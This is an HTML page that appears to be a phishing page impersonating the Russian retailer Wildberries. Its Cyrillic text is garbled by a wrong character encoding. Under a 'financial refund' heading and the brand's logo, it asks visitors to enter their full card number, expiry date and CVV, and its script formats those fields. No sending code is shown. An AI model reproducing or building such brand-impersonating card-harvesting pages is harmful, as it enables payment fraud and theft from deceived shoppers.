<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>–§–∏–Ω–∞–Ω—Å–æ–≤—ã–π –≤–æ–∑–≤—Ä–∞—Ç</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
      margin: 0;
      padding: 0;
    }

    /* üîù –®–∞–ø–∫–∞ */
    header {
      width: 100%;
      background: #9b4dca;
      position: sticky;
      top: 0;
      z-index: 10;
      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
      text-align: center;
    }
    header .logo-link {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      color: white;
      text-decoration: none;
      font-size: 26px;
      font-weight: bold;
      padding: 18px;
      cursor: pointer;
    }
    header .logo-link img {
      height: 32px;
      width: 32px;
    }

    .container {
      max-width: 400px;
      margin: 40px auto;
      padding: 20px;
      background: white;
      border-radius: 8px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      color: #a000c8;
      margin-bottom: 5px;
    }
    .subtitle {
      text-align: center;
      font-size: 15px;   /* üîπ —É–≤–µ–ª–∏—á–µ–Ω–Ω—ã–π —Ç–µ–∫—Å—Ç */
      color: #555;       /* üîπ —Ç—ë–º–Ω–æ-—Å–µ—Ä—ã–π */
      margin: 0 0 20px 0;
      line-height: 1.5;
    }
    input, select, textarea, button {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
      box-sizing: border-box;
    }
    .row {
      display: flex;
      gap: 10px;
      width: 100%;
    }
    .row input {
      flex: 1 1 0;
      box-sizing: border-box;
    }
    button {
      background: #a000c8;
      color: white;
      font-size: 18px;
      border: none;
      cursor: pointer;
    }
    button:hover {
      background: #8a00a8;
    }
  </style>
</head>
<body>
  <!-- üîù –®–∞–ø–∫–∞ —Å –ø–µ—Ä–µ—Ö–æ–¥–æ–º -->
  <header>
    <a href="https://www.wildberries.ru/" target="_blank" class="logo-link">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Wildberries_logo.svg/512px-Wildberries_logo.svg.png" alt="logo">
      <span>WILDBERRIES</span>
    </a>
  </header>

  <div class="container">
    <h2>–§–∏–Ω–∞–Ω—Å–æ–≤—ã–π –≤–æ–∑–≤—Ä–∞—Ç</h2>
    <p class="subtitle">–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –≤–æ–∑–≤—Ä–∞—Ç–∞ –¥–µ–Ω–µ–≥ –≤–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã</p>
    <form>
      <input type="tel" id="orderNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required>
      
      <div class="row">
        <input type="tel" id="expiry" placeholder="00 / 00" maxlength="7" inputmode="numeric" required>
        <input type="tel" id="cvv" placeholder="000" maxlength="3" inputmode="numeric" required>
      </div>
      
      <select required>
        <option value="" disabled selected>–ü—Ä–∏—á–∏–Ω–∞ –≤–æ–∑–≤—Ä–∞—Ç–∞</option>
        <option value="defect">–î–µ—Ñ–µ–∫—Ç</option>
        <option value="wrong">–ù–µ–≤–µ—Ä–Ω—ã–π —Ç–æ–≤–∞—Ä</option>
        <option value="other">–î—Ä—É–≥–æ–µ</option>
      </select>
      
      <textarea placeholder="–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π (–ø–æ –∂–µ–ª–∞–Ω–∏—é)"></textarea>
      <button type="submit">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∑–∞–ø—Ä–æ—Å</button>
    </form>
  </div>

  <script>
    const cardInput = document.getElementById('orderNumber');
    const expiryInput = document.getElementById('expiry');
    const cvvInput = document.getElementById('cvv');

    // –ú–∞—Å–∫–∞ –¥–ª—è –Ω–æ–º–µ—Ä–∞ –∫–∞—Ä—Ç—ã
    cardInput.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      value = value.slice(0,16);
      const parts = value.match(/.{1,4}/g);
      e.target.value = parts ? parts.join(' ') : '';
      if (value.length === 16) expiryInput.focus();
    });

    // –ú–∞—Å–∫–∞ –¥–ª—è MM / YY
    expiryInput.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 4) value = value.slice(0,4);
      if (value.length > 2) {
        e.target.value = value.slice(0,2) + " / " + value.slice(2);
      } else {
        e.target.value = value;
      }
      if (value.length === 4) cvvInput.focus();
    });

    // –ú–∞—Å–∫–∞ –¥–ª—è CVV
    cvvInput.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
    });
  </script>
</body>
</html>
